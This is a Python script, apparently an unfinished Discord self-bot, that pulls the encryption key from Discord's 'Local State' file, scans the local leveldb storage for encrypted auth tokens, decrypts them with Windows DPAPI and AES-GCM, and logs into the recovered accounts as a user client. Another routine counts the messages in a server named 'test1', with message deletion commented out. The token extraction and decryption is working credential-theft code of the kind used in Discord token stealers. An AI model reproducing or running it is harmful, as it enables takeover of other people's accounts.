import os
import asyncio

import discord
from dotenv import load_dotenv
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from json import loads
from re import findall

load_dotenv()

client = discord.Client()
gl_token = os.getenv('DS_TOKEN')
enc_token = os.getenv('ENC_TOKEN')
clear_chat_name = 'test1'
global_nickname = ''


@client.event
async def on_ready():
    print(f'Logged in as {client.user.name} (ID: {client.user.id})')
    # # await list_channels()
    # # token_test()
    # await client.close()
    # await list_channels()


async def verify_token_with_nickname(tokens: set, nickname: str):
    for token in tokens:
        try:
            await client.start(token, bot=False)
            #await client.connect()
            print(client.user.name)
            # if client.user.name == nickname:
            if client.user.name == '':
                return token
            else:
                await client.logout()
                continue
        except Exception as e:
            raise e
    return "Not found"


#@client.event
async def list_channels():
    print(client.guilds)
    for private_channel in client.guilds:
        if isinstance(private_channel, discord.Guild):
            print('Found private chat')
            if private_channel.name == clear_chat_name:
                print(f'Yes its {clear_chat_name}')
                # messages = len(await private_channel.history(limit=None).flatten())
                counter = 0
                for channel in private_channel.text_channels:
                    print(channel.name)
                    async for message in channel.history(limit=None):
                        # if message.author.name == client.user.name:
                        counter += 1
                print(counter)
                # for message in messages:
                #     print(await message.delete())


async def get_secret_key():
    try:
        with open(os.getenv('APPDATA') + '\\discord' + '\\Local State', 'r') as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
            file.close()
        return key
    except Exception as e:
        raise e


async def find_auth_tokens_encrypted():
    tokens = set()
    path = os.getenv('APPDATA') + '\\discord' + '\\Local Storage' + '\\leveldb'
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in (x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()):
                for found_token in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    tokens.add(found_token)
        return tokens
    except Exception as e:
        raise e


async def decrypt_token(auth_token_encrypted: bytes | bytearray | memoryview,
                        secret_key_encrypted: bytes | bytearray | memoryview):
    try:
        secret_key_decrypted = CryptUnprotectData(secret_key_encrypted, None, None, None, 0)[1]
        auth_token_decrypted = AES.new(key=secret_key_decrypted, mode=AES.MODE_GCM,
                                       nonce=auth_token_encrypted[3:15]).decrypt(
            auth_token_encrypted[15:])[:-16].decode()
        return auth_token_decrypted
    except Exception as e:
        raise e


async def token_test():
    tokens = await find_auth_tokens_encrypted()
    print(tokens)
    secret_key = await get_secret_key()
    print(secret_key)
    final_tokens = set()
    for encrypted_token in tokens:
        final_tokens.add(
            await decrypt_token(b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1]), b64decode(secret_key)[5:]))
    print(final_tokens)
    return final_tokens
    # global gl_token
    # gl_token = final_tokens


async def abbbbb():
    valid_tokens = await token_test()
    await verify_token_with_nickname(valid_tokens, global_nickname)
    # await client.start(gl_token, bot=False, reconnect=False)
    # client.login(gl_token, bot=False)
    # client.connect(reconnect=False)


async def main():
    # await client.login(token=gl_token,bot=False)
    # await client.connect()
    # await abbbbb()
    tasks = [
        asyncio.create_task(abbbbb())
    ]
    await asyncio.wait(tasks)

    # await client.start(gl_token, bot=False, reconnect=False)
    # loop = asyncio.get_event_loop()
    # tasks = await asyncio.gather(abbbbb())
    # client.logout
    #
    # loop.run_until_complete(tasks)

    # client.run(gl_token, bot=False, reconnect=False)
    # await client.close()

    # print(client.user)

    # loop = asyncio.get_event_loop()
    #
    # # check if the event loop is already running
    # if (loop.is_running()):
    #     print(f"Event loop is already running.")
    #
    # # create and schedule a new task
    # task = loop.create_task(abbbbb())
    #
    # # wait for the task to complete
    # await task


# loop = asyncio.get_event_loop()
# tasks = asyncio.gather(
#     asyncio.async(abbbbb())
# )
# #client.run(gl_token, bot=False)
# try:
#     loop.run_until_complete(tasks())
# except KeyboardInterrupt:
#     # cancel all tasks lingering
#     tasks.cancel()
# finally:
#     loop.close()


if __name__ == '__main__':
    # main()
    asyncio.run(main())

    # tasks = asyncio.gather(
    #     abbbbb()
    # )
    # client.run(gl_token, bot=False)
    # try:
    #     loop.run_until_complete(tasks())
    # except KeyboardInterrupt:
    #     # cancel all tasks lingering
    #     tasks.cancel()
    #     loop.run_forever()
    #     tasks.exception()
    # finally:
    #     loop.close()
